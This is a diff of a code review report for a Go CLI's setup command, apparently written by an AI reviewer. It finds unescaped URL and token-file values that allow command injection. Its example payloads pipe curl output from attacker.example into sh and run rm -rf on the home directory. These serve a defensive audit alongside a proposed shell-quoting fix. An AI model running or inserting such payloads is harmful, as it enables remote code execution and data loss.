@@ -1,8 +1,8 @@
 ---
 phase: 02-setup-command-core
-reviewed: 2026-08-30T13:58:15Z
+reviewed: 2026-08-30T15:14:28Z
 depth: standard
-files_reviewed: 28
+files_reviewed: 29
 files_reviewed_list:
   - cmd/engram/catalog.go
   - cmd/engram/catalog_test.go
@@ -36,233 +36,195 @@ files_reviewed_list:
   - internal/surfaces/toolclass.go
 findings:
   critical: 1
-  warning: 2
-  info: 2
-  total: 5
+  warning: 0
+  info: 3
+  total: 4
 status: issues_found
 ---
 
-# Phase 02: Code Review Report
+# Phase 02: Code Review Report (re-review after gap-closure plan 02-03)
 
-**Reviewed:** 2026-08-30T13:58:15Z
+**Reviewed:** 2026-08-30T15:14:28Z
 **Depth:** standard
-**Files Reviewed:** 28
+**Files Reviewed:** 29
 **Status:** issues_found
 
 ## Summary
 
-Reviewed the `internal/setup` package (Runtime/Detect/Plan, the injectable Environment
-seam, the three runtimes) and its `engram setup` CLI wiring in `cmd/engram/setup.go`,
-plus the exit-status taxonomy (`internal/setup.Classify`, the five exit-code constants
-in `client_common.go`, and their catalog/test coverage).
+This is a re-review of Phase 02 ("Setup Command Core") after gap-closure plan 02-03, which
+closed three findings from the previous review pass: CR-01 (dead ENGRAM_URL/ENGRAM_AUTH env
+lane), WR-01 (missing required-URL guard), and WR-02 (`--runtime` did not dedupe repeats).
 
-The preview/apply boundary (invariant 3) holds: `setupPreview` performs only
-`exec.LookPath`-style detection through the injected `Environment` seam and pure string
-authoring in `Plan()`; no file write, no runtime-CLI execution, and no lock acquisition
-happens on any code path this phase ships, confirmed by tracing every call site and by
-`TestSetupPreviewExecutesNoRuntimeCLI`. Secret handling (invariant 6) is also sound:
-`bearerProvenance` never opens, stats, or reads `--token-file`, and every bearer-mode
-`Action.Command` embeds only the file's *path* or a fixed `ENGRAM_TOKEN` name, never
-content — confirmed by `TestPlanBearerNeverReadsTokenFile` and by direct inspection.
-`internal/setup.Classify`'s outcome table is genuinely exhaustive over all five `Outcome`
-values, and `OutcomeNotPresent` is a real first-class value, never a zero-value stand-in
-(the zero value `""` is explicitly routed to the failure branch — see `exit.go`'s
-`default` case). The three published exit codes (`exitOK`/`exitPartial`/
-`exitSetupFailed`) are wired consistently across `client_common.go`, `catalog.go`,
-`setup.go`'s `setupExitCode`, and their respective tests.
+**All three prior findings are confirmed fixed and correctly implemented, with no regressions:**
 
-One BLOCKER was found and confirmed empirically (not just by static reading): the
-`setup.url`/`setup.auth` registry rows declare `ENGRAM_URL`/`ENGRAM_AUTH` as env-first
-overrides, but `cmd/engram/setup.go` never routes its flags through `config.Load`, so
-those two environment variables are completely inert despite being advertised in
-`--help` text and in `internal/config`'s own design commentary. Two WARNINGs and two INFO
-items round out the report.
+- **CR-01** — `setupPlanDoc` (`cmd/engram/setup.go:151-195`) now routes `--url`/`--auth` through
+  `config.Load(cmd.Flags())`, and `internal/config/registry.go:113-114` carries `setup.url` /
+  `setup.auth` rows with `Env: "ENGRAM_URL"` / `Env: "ENGRAM_AUTH"`. No second, bespoke
+  `os.Getenv` read for either value exists anywhere in `cmd/engram/setup.go` or
+  `internal/setup/*.go` (confirmed by grep) — a single resolution path, as required. Flag-beats-
+  env precedence, env-only, and flag-only paths are each exercised by
+  `TestSetupURLFromEnvReachesCommand`, `TestSetupAuthFromEnvSelectsBearerForm`, and
+  `TestSetupFlagBeatsEnvForURL` (`cmd/engram/setup_test.go`).
+- **WR-01** — `cmd/engram/setup.go:181-190` rejects an empty `cfg.Setup.URL` with
+  `usageErrorf("--url or ENGRAM_URL is required")` (exit 2), covering the no-flag/no-env case,
+  `ENGRAM_URL=""`, and an explicit `--url ""` — all three are exercised by
+  `TestSetupMissingURLIsUsageError`'s three subtests, and the assertion also confirms stdout
+  never carries a `would-write` outcome alongside the error.
+  `--apply` has **no** registry `Env` row (confirmed: no `apply` entry in
+  `internal/config/registry.go`), so the CR-01 fix did not open a way to flip preview into
+  mutation via environment — consistent with the project's stated constraint.
+- **WR-02** — `internal/setup/runtime.go:96-118`'s `Select` now dedupes a repeated `--runtime`
+  name to its first occurrence, preserving caller-stated order, while still erroring on an
+  unknown name even when repeated. `TestSelectDedupesRepeatedNames`
+  (`internal/setup/plan_test.go:117-153`) covers `a,a`, an interleaved `codex,claude-code,codex`
+  case, and a repeated-unknown-name case.
+
+Testing throughout this phase is unusually thorough (env/flag precedence, byte-for-byte URL
+passthrough, determinism, dedup order, exhaustive `Classify` outcome-combination coverage,
+golden-file drift gates). No test-quality defects were found.
+
+The re-review did surface one **new** issue, not part of the three closed findings: the
+strings `internal/setup`'s three `Runtime.Plan` implementations author for `--url` (and, via
+`bearerProvenance`, for `--token-file`) are interpolated into the emitted "ready-to-issue"
+command **with no shell-escaping at all** — and CR-01's own fix is what newly gives an
+environment-sourced (not manually typed) value a direct path into that string. See CR-01 below
+(renumbered from the prior review; this is a distinct, newly-identified issue, not a reopened
+one).
 
 ## Critical Issues
 
-### CR-01: `ENGRAM_URL` and `ENGRAM_AUTH` are declared env-first but have zero effect on `engram setup`
+### CR-01: Unescaped `--url`/`--token-file` interpolation into the authored `mcp add` command enables command injection if the preview is copied into a shell
 
-**File:** `cmd/engram/setup.go:361-376` (flag registration), `cmd/engram/setup.go:152-174`
-(`setupPlanDoc`), `internal/config/registry.go:100-114` (`setup.url`/`setup.auth` rows),
-`internal/config/config.go:264-279` (`SetupConfig`)
+**File:** `internal/setup/claudecode.go:46,54-56,63-66`; `internal/setup/codex.go:43,51,59`;
+`internal/setup/opencode.go:44,52-54`; `internal/setup/plan.go:88-103` (`bearerProvenance`);
+`internal/config/client_validate.go:78-84` (`ValidateSetupAuth` validates only the auth
+enum — nothing validates or sanitizes `cfg.Setup.URL`'s shape); `cmd/engram/setup.go:181-190`
+(the required-URL guard checks only for emptiness).
 
-**Issue:** `internal/config/registry.go` declares `setup.url` (`Env: "ENGRAM_URL"`) and
-`setup.auth` (`Env: "ENGRAM_AUTH", Default: "oauth"`) as ordinary env-first-with-flag-
-override entries — the registry's own comment states they are "enrolled env-first with
-flag override like the 45/48 majority of this registry." `internal/config.Config.Setup`
-(`SetupConfig{URL, Auth}`) exists to carry the resolved values, and its doc comment
-repeats the `ENGRAM_URL / --url` / `ENGRAM_AUTH / --auth` precedence claim.
+**Issue:** Every `Runtime.Plan` builds its `Command` string with a bare `fmt.Sprintf("... %s ...", opts.URL)`
+(and, for `--auth bearer`, `bearerProvenance(opts.TokenFile)` inside a double-quoted
+`--header "Authorization: Bearer %s"` segment) — `opts.URL` and `opts.TokenFile` are never
+shell-quoted or escaped anywhere in this call chain. `opts.URL` comes from `cfg.Setup.URL`,
+which is validated only for non-emptiness (`cmd/engram/setup.go:181-190`); no `net/url.Parse`
+or format check runs anywhere on it, and no registry-level sanitization exists in
+`internal/config/config.go`'s `SetupConfig` or `client_validate.go`'s `ValidateSetupAuth`.
 
-However, `cmd/engram/setup.go` never calls `config.Load(cmd.Flags())` anywhere (unlike
-`client_common.go:134` and `serve.go:69`, the two commands that actually do this). Its
-`init()` binds `--url`/`--auth` directly to package vars with `pflag.StringVar`, defaulted
-only from `config.FlagDefault(...)` — the registry's *static* `Default` field, which does
-not consult the environment at all:
+Two concrete injection vectors follow directly from this:
 
-```go
-setupCmd.Flags().StringVar(&setupURL, "url", config.FlagDefault("url"), ...)
-setupCmd.Flags().StringVar(&setupAuth, "auth", config.FlagDefault("auth"), ...)
-```
+1. **Via `--url`/`ENGRAM_URL`:** a value such as
+   `https://good.example.com/mcp; curl -s http://attacker.example/x | sh #` produces (claude-code,
+   oauth mode):
+   `claude mcp add --transport http engram https://good.example.com/mcp; curl -s http://attacker.example/x | sh # --scope user`
+   Anyone (or any tool) that copies this "exact command it would issue" — which is the command's
+   entire stated purpose (`cmd/engram/setup.go:33-43`'s own doc comment: "reports the exact
+   command it would issue") — into a shell executes the injected `curl … | sh` as a second
+   statement. `plan.go:11-16`'s own doc comment states this string is "AUTHORED HERE and nowhere
+   else" and that "a later phase that executes them (Apply, Phase 3) … must consume these
+   strings, never re-derive them" — meaning Phase 3's `--apply` is explicitly committed to
+   executing this exact, unescaped string, very likely via a shell (`sh -c command` or
+   equivalent), at which point this stops being a "someone has to copy-paste it" risk and
+   becomes a direct, unattended command-injection sink.
+2. **Via `--token-file`:** `bearerProvenance` (`plan.go:98-103`) embeds the token-file *path*
+   verbatim inside a double-quoted string segment
+   (`--header "Authorization: Bearer <from %s>"`, `claudecode.go:63-66` / `opencode.go:52-54`).
+   A path containing a double quote — e.g. `--token-file 'x" ; rm -rf ~ #'` — breaks out of that
+   quoting the same way.
 
-`Config.Setup` is never referenced anywhere outside its own declaration (`rg
-"\.Setup\b|SetupConfig"` across the whole repo returns only the declaration site and the
-`koanf:"setup"` struct tag) — the entire `SetupConfig` type and its two registry rows are
-dead code from the moment they were written.
+This is materially worsened by the very fix under review: **CR-01 (the ENGRAM_URL/ENGRAM_AUTH
+env lane)** now feeds an environment-sourced value into this same unescaped path. A CLI flag is
+at least typically typed by the operator invoking the command at that moment; an environment
+variable is routinely inherited from a shared `.envrc`, CI job, systemd unit, Docker/Compose
+file, or devcontainer config the invoking operator did not personally author or re-check at
+invocation time — and `engram setup`'s whole target audience is the AI coding agents named as
+its own `--runtime` values (claude-code, codex, opencode), which are exactly the kind of
+consumer likely to act on a previewed command's text programmatically rather than eyeball it
+for injected shell syntax first.
 
-Confirmed empirically (not just by reading), by running the built binary with the env
-vars set and no matching flags:
+Nothing in this phase's test suite (`cmd/engram/setup_test.go`, `internal/setup/plan_test.go`)
+exercises a URL or token-file path containing shell metacharacters — `TestSetupEnvURLPassedVerbatim`
+tests percent-encoding passthrough, not shell safety, so this gap is untested as well as
+unmitigated.
 
-```
-$ ENGRAM_URL="https://env-url.example.com/mcp" ENGRAM_AUTH="bearer" \
-    go run ./cmd/engram setup --output json
-{"runtimes":[
-  {"name":"claude-code","outcome":"would-write",
-   "command":"claude mcp add --transport http engram  --scope user"},
-  {"name":"codex","outcome":"would-write",
-   "command":"codex mcp add engram --url "},
-  {"name":"opencode","outcome":"would-write",
-   "command":"opencode mcp add engram --url "}]}
-```
-
-Both `ENGRAM_URL` (the endpoint never appears at all — see the blank `--url ` and the
-double space in claude-code's command) and `ENGRAM_AUTH=bearer` (none of the three
-commands take the bearer form — no `--header`, no `--bearer-token-env-var`) are silently
-ignored. This directly contradicts:
-- the flag help text itself: `"...used verbatim — never appended to or stripped (default:
-  ENGRAM_URL)"` and `"...(default: ENGRAM_AUTH)"` (both false claims as shipped);
-- `internal/config/registry.go`'s own stated design intent for these two rows;
-- the general env-first contract every other configured value in this registry honors
-  (project invariant 2: 45 of 48 registry rows have an `Env` fallback that actually
-  works — these two are silently broken, not documented exceptions).
-
-No test in `cmd/engram/setup_test.go`, `internal/config/client_validate_test.go`, or
-anywhere else sets `ENGRAM_URL`/`ENGRAM_AUTH` and asserts on the resulting command, so
-this gap has no regression coverage at all — the only test that exercises
-`setupRuntimeEnvDefault` (`ENGRAM_RUNTIME`) covers the ONE flag among the three that
-actually does read its env var directly (via `os.Getenv` in `setupRuntimeEnvDefault`,
-not through the registry).
-
-**Fix:** Route `--url`/`--auth` through the registry the way `client_common.go` and
-`serve.go` already do, e.g.:
+**Fix:** Shell-quote each interpolated value at the point Plan authors the command string —
+e.g. a small `shellQuote(s string) string` helper (wrap in single quotes, escaping any embedded
+single quote as `'\''`) applied to `opts.URL` and to the token-file path inside
+`bearerProvenance`, in all three runtime files:
 
 ```go
-func setupPlanDoc(cmd *cobra.Command) (setupReportDoc, error) {
-	cfg, err := config.Load(cmd.Flags())
-	if err != nil {
-		return setupReportDoc{}, usageErrorf("load setup configuration: %w", err)
-	}
-	if err := config.ValidateSetupAuth(cfg.Setup.Auth); err != nil {
-		return setupReportDoc{}, usageErrorf("%w", err)
-	}
-	auth := cfg.Setup.Auth
-	if auth == "" {
-		auth = "oauth"
-	}
-	runtimes, err := setup.Select(setupRuntime)
-	if err != nil {
-		return setupReportDoc{}, usageErrorf("%w", err)
-	}
-	opts := setup.Options{URL: cfg.Setup.URL, Auth: auth, TokenFile: setupTokenFile}
-	rows := setupBuildRows(setupEnv, runtimes, opts)
-	return setupReportDoc{Runtimes: rows}, nil
+// internal/setup/shellquote.go (new)
+func shellQuote(s string) string {
+    return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
 }
 ```
 
-and add regression coverage (`t.Setenv("ENGRAM_URL", ...)` / `t.Setenv("ENGRAM_AUTH",
-...)` with no matching flag, asserting the emitted `Command` reflects the env value) —
-either delete `SetupConfig`/the two registry rows if env support for `--url`/`--auth` is
-genuinely out of scope, or wire it up; leaving the registry rows in place while silently
-not consulting them is the worst of both options because it actively documents a
-guarantee the code does not keep.
+```go
+// claudecode.go, codex.go, opencode.go — every fmt.Sprintf that embeds opts.URL:
+Command: fmt.Sprintf("claude mcp add --transport http engram %s --scope user", shellQuote(opts.URL)),
+```
+
+```go
+// plan.go
+func bearerProvenance(tokenFile string) string {
+    if tokenFile == "" {
+        return "<from ENGRAM_TOKEN>"
+    }
+    return fmt.Sprintf("<from %s>", shellQuote(tokenFile))
+}
+```
+
+This keeps the URL's own bytes unmodified (D-02's "never appended to, stripped, normalized"
+contract is about the URL's *content*, not about whether the surrounding shell syntax is safe to
+paste) while closing the injection path. Add a test asserting that a URL/token-file path
+containing `;`, `` ` ``, `$(`, `|`, and `'` round-trips safely (renders as a single shell word,
+not as multiple statements) before Phase 3 wires `--apply` to actually execute these strings.
 
 ## Warnings
 
-### WR-01: No validation that `--url`/`ENGRAM_URL` is non-empty before authoring a preview command
-
-**File:** `cmd/engram/setup.go:148-174` (`setupPlanDoc`), `internal/setup/claudecode.go:40-73`,
-`internal/setup/codex.go:37-66`, `internal/setup/opencode.go:38-61`
-
-**Issue:** Nothing rejects an empty `--url` (no `cmd.MarkFlagRequired("url")`, no explicit
-empty-string check in `setupPlanDoc`). Every `Runtime.Plan` happily formats the empty
-string into its invocation, producing a malformed, misleading "would-write" preview, e.g.
-`claude mcp add --transport http engram  --scope user` (note the double space where the
-URL argument should be) or `codex mcp add engram --url ` (trailing space, no value).
-Reproduced directly: `go run ./cmd/engram setup --output json` (no `--url` set) prints
-exactly this shape for all three runtimes. A caller relying on the preview text to decide
-what to run — or worse, copy-pasting it — gets a broken command with no indication
-anything is wrong; the command still reports `outcome: would-write`, not `failed`.
-
-**Fix:** Treat a missing URL as a usage error in `setupPlanDoc`, the same way
-`clientFromFlags` rejects a missing `--server`:
-
-```go
-if setupURL == "" {
-    return setupReportDoc{}, usageErrorf("--url or ENGRAM_URL is required")
-}
-```
-
-(This also needs test coverage: `TestSetupPreviewExitsZeroRegardlessOfPresence` currently
-omits `--url` entirely and only checks the exit code, never the command content, so this
-gap has no regression coverage today.)
-
-### WR-02: `setup.Select` does not deduplicate repeated `--runtime` values
-
-**File:** `internal/setup/runtime.go:87-104`
-
-**Issue:** `Select` appends one entry to `out` per name in the input slice with no
-dedup check. Because `--runtime` is a `StringSliceVar` (comma-separated or repeatable),
-`engram setup --runtime claude-code,claude-code` (or `--runtime claude-code --runtime
-claude-code`) resolves to `[]Runtime{ClaudeCode, ClaudeCode}`, and `setupBuildRows`
-faithfully emits two identical rows for "claude-code" in the JSON `runtimes` array. Under
-`--apply` this also inflates `setupApplySummary`'s and the returned `cliError`'s "%d of %d
-selected runtime(s) failed" counts (e.g. reporting "2 of 2 failed" for what is really one
-physical runtime attempted twice), which is misleading to a caller scripting against that
-count.
-
-**Fix:** Dedupe in `Select`, e.g. skip a name already present in `out` (or reject a
-duplicate as a usage error, mirroring the existing "unknown runtime" rejection) —
-whichever behavior is chosen, add a test pinning it, since none exists today.
+None.
 
 ## Info
 
-### IN-01: `Action.Description` is populated everywhere but read nowhere
+### IN-01: Duplicate "failed" count computation in the `--apply` path
 
-**File:** `internal/setup/plan.go:59-62`, and every `Plan()` implementation in
-`claudecode.go`, `codex.go`, `opencode.go` (12 call sites total)
+**File:** `cmd/engram/setup.go:262-270` (`setupApplySummary`) and `:324-329` (inline in
+`setupApplyRun`)
+**Issue:** `setupApplyRun` computes the same `failed` count twice: once inside
+`setupApplySummary(rows)` for the headline, and again in its own loop immediately before
+constructing the `*cliError`. The two counts can never actually drift (both iterate the same
+`rows` slice with the same predicate), so this is a maintainability nit, not a bug.
+**Fix:** Have `setupApplySummary` return `(summary string, failed int)`, or expose a small
+`countFailed(rows []setupRuntimeRow) int` helper both call sites share.
 
-**Issue:** Every `Plan()` branch across all three runtimes populates
-`Action.Description` with a human-readable label (e.g. "register engram as a user-scope
-MCP server (bearer token)"). `cmd/engram/setup.go`'s `setupBuildRows` only ever reads
-`plan.Actions[0].Command`; `Description` is never surfaced in the JSON document, the text
-view, or anywhere else (`rg "\.Description\b"` across `internal/setup` and `cmd/engram`
-turns up only the write sites). This is either dead effort that should be trimmed, or a
-missed opportunity to explain the previewed command to an operator — worth a decision
-either way rather than silently carrying an unused field through every code path.
+### IN-02: `--token-file`'s pflag default is hardcoded rather than routed through the registry
 
-**Fix:** Either surface `Description` in `setupRuntimeRow` (e.g. a `description` JSON
-field, consistent with the D-15 "text and json both render one document" design already
-used for `Command`/`Reason`), or drop the field until a consumer exists.
+**File:** `cmd/engram/setup.go:393-394`
+**Issue:** `--url` and `--auth` both derive their pflag default from `config.FlagDefault(...)`
+(the single source of truth `internal/config/registry.go` documents), but `--token-file`'s
+default is hardcoded as the literal `""`:
+```go
+setupCmd.Flags().StringVar(&setupTokenFile, "token-file", "",
+    "path to a file containing the bearer credential for --auth bearer ...")
+```
+This happens to match `registry.go`'s `client.token_file` row (which also has no `Default`), so
+there is no live divergence today, but it is the one flag on this command that breaks the
+otherwise-consistent "derive the default from the registry" pattern the other five flags follow.
+**Fix:** `config.FlagDefault("token-file")` in place of the literal `""`, for consistency (no
+behavior change today).
 
-### IN-02: `Environment.Getenv` and `Environment.HomeDir` are unused by every current `Runtime`
+### IN-03: Validation order surfaces a secondary error before the more fundamental missing-URL error
 
-**File:** `internal/setup/environment.go:20-32`, `internal/setup/claudecode.go`,
-`internal/setup/codex.go`, `internal/setup/opencode.go`
-
-**Issue:** `Environment`'s doc comment describes it as "the injectable seam every
-Runtime's Detect/Plan consults for external-boundary reads: which binaries are on PATH,
-environment variables, and the caller's home directory," but as shipped this phase, only
-`LookPath` is ever called (`rg "env\.Getenv|env\.HomeDir"` across non-test `internal/setup`
-files returns no hits). This is plausibly deliberate forward-provisioning for a later
-phase, but as it stands the two fields are unreachable dead surface with no current
-producer or consumer — worth a one-line note if intentional, since a future reviewer
-cannot otherwise tell "unused so far, reserved for later" from "wired up somewhere I
-missed."
-
-**Fix:** No action required if this is confirmed intentional; otherwise trim the unused
-fields until a runtime actually needs them.
+**File:** `cmd/engram/setup.go:151-195` (`setupPlanDoc`)
+**Issue:** `setupPlanDoc` validates `--auth` (`ValidateSetupAuth`) and resolves `--runtime`
+(`setup.Select`) *before* checking whether a URL was supplied at all. A caller who both mistypes
+`--auth` (or `--runtime`) and omits `--url`/`ENGRAM_URL` sees only the auth/runtime error and
+never learns the URL is also missing until they fix the first one and re-run. This is a minor UX
+rough edge, not a correctness defect — `TestSetupExitCodes`/`exitcode_baseline_test.go`'s
+`setup/bad-auth` case happens to pass either way since both errors map to `exitUsage` (2).
+**Fix:** Optional — check `cfg.Setup.URL == ""` first, ahead of `ValidateSetupAuth`/`Select`, so
+the most fundamental configuration gap is always reported first.
 
 ---
 
-_Reviewed: 2026-08-30T13:58:15Z_
+_Reviewed: 2026-08-30T15:14:28Z_
 _Reviewer: Claude (gsd-code-reviewer)_
 _Depth: standard_
